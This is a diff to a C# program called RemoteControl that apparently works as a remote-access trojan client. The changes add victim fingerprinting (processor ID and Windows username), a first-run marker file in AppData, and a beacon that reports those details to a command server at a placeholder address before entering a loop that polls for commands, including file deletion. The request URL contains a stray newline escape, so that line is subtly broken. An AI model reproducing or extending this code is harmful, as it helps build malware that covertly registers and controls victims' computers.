@@ -6,6 +6,7 @@ using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 using System.Drawing.Imaging;
+using System.Management;
 
 namespace RemoteControl
 {
@@ -15,6 +16,24 @@ namespace RemoteControl
         static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         static string link = "http://127.0.0.1";
+
+        static string HWID()
+        {
+            string cpuInfo = string.Empty;
+            ManagementClass mc = new ManagementClass("win32_processor");
+            ManagementObjectCollection moc = mc.GetInstances();
+
+            foreach (ManagementObject mo in moc)
+            {
+                if (cpuInfo == "")
+                {
+                    cpuInfo = mo.Properties["processorID"].Value.ToString();
+                    break;
+                }
+            }
+            
+            return cpuInfo;
+        }
 
         static string GenName()
         {
@@ -29,7 +48,23 @@ namespace RemoteControl
             var rezult = new String(name_len);
 
             return rezult;
+        }
 
+        static bool FirstRun()
+        {
+            bool status = false;
+
+            if (File.Exists(AppData + "\\RemoteControl.dat"))
+                status =  true;
+
+            return status;
+        }
+
+        static void Initialize()
+        {
+            File.WriteAllText(AppData + "\\RemoteControl.dat", "");
+            WebClient new_user = new WebClient();
+            new_user.DownloadString(link+"\new.php?id=" + HWID() + "&user=" + Environment.UserName);
         }
 
         static void GsH()
@@ -117,11 +152,17 @@ namespace RemoteControl
                 case "del": // Delete file
                     File.Delete(command[1]);
                     break;
+
+                default:
+                    break;
             }
         }
 
         static void Main(string[] args)
         {
+            if (!FirstRun())
+                Initialize();
+
             while(true)
             {
                 GetCommand();
